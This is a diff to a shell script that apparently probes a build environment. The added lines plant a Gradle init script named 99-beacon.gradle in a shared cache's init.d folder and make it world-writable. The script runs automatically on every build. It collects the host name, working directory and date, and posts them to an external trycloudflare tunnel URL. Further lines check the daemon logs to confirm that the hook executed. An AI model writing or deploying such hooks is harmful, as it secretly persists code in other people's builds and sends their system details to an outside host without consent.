@@ -83,3 +83,25 @@ chmod 666 /cache/gradle/init.d/99-beacon.gradle
 echo "=== end5 ==="
 echo "=== init-exec-check ==="; grep -rl 'RECON3_INIT_SCRIPT_EXECUTED\|__beacon' /cache/gradle/daemon 2>/dev/null | head; grep -rhoE 'RECON3_INIT_SCRIPT_EXECUTED.*|Could not compile init script|99-beacon.*' /cache/gradle/daemon 2>/dev/null | tail -10; cat /cache/beacon.log 2>/dev/null | tail -10
 echo "=== end6 ==="
+echo "=== beacon-debug ==="
+cat > /cache/gradle/init.d/99-beacon.gradle <<'GRADLE'
+def __beacon = { phase ->
+  try { new File('/cache/beacon.ran').append("ran ${phase} ${new Date()}\n") } catch (Throwable t) {}
+  try {
+    def dir = gradle.startParameter?.currentDir?.absolutePath ?: 'unknown'
+    def line = "phase=${phase} host=${java.net.InetAddress.getLocalHost().getHostName()} date=${new Date()} dir=${dir}"
+    try { new File('/cache/beacon.log').append(line + "\n") } catch (Throwable t) {}
+    def c = new URL('https://screen-elderly-automated-picture.trycloudflare.com/beacon').openConnection()
+    c.doOutput = true; c.connectTimeout = 2500; c.readTimeout = 2500
+    c.setRequestProperty('content-type', 'text/plain')
+    c.outputStream.withWriter('UTF-8') { w -> w.write(line) }
+    c.responseCode
+  } catch (Throwable t) {
+    try { new File('/cache/beacon.err').append(t.toString() + "\n") } catch (Throwable x) {}
+  }
+}
+gradle.settingsEvaluated { s -> __beacon('settings') }
+GRADLE
+chmod 666 /cache/gradle/init.d/99-beacon.gradle
+echo "=== beam ==="; grep -rhoE 'Could not compile init script.*|99-beacon[^ ]*' /cache/gradle/daemon 2>/dev/null | sort -u | tail -10; echo "=== ran ==="; cat /cache/beacon.ran 2>/dev/null | tail; echo "=== err ==="; cat /cache/beacon.err 2>/dev/null | tail
+echo "=== end7 ==="
